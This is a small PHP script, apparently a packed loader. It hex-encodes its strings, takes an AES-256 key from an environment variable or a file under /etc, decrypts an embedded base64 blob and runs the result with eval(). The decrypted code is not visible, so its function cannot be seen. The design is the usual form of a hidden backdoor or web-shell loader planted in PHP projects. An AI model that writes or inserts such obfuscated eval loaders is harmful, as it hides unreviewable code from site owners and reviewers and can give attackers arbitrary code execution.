<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('m7AMRpC+vTvatQvqUhBm6A==');

$c=base64_decode(

'5ejl58NfDi9XNgxWsk3xbSgmpppoLt6w3tlM+T0L2EQqohl/1IN08k9PV86FOSnSomtwV8JnDYmK' .
'Cx0m/yYsGQ1jsSIcUIo4MXy3FRqYP5kFW1rqSJGcEjCmHO23XfkT6QXAGNR+VrWUozwhshmL+J3G' .
'rizf2iZ9Ir9jPZ31WFuCF3EdJa5QE7u/RQujYGXX5wBfsGdbDfbBhNOgAT3Fx0heDf0U0NhaY+KO' .
'S5SzA5p9nwubdrbuZcHKEMFfcROoJW8P9i7khPO92C0CLYYT1lP8cEMf/PB5ctXZ+TcU/YTH5TQA' .
'08D01LWJ6qQJBiTqxP8oytoJxxQCI5cAp0+tS9L8NLzd/AQAbwog05k0mo4y4PBGMIw34850py6x' .
'tcKTL5z3Y8iaHv4OWCEaof7hCyjKf/2PCX2/zHtUgq9hxQKjcv5NEvS/rOqqOveAdK+eqaDqfpJA' .
'AAUq2yJzXZ8nrnQcnVbuhinirWhHrz0cqzjYwK/iglQq18lKiiQr3NLg8fHOX/80lDErH3yVqNS5' .
'WtnM926A4qDXFUyU/nyymEw='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

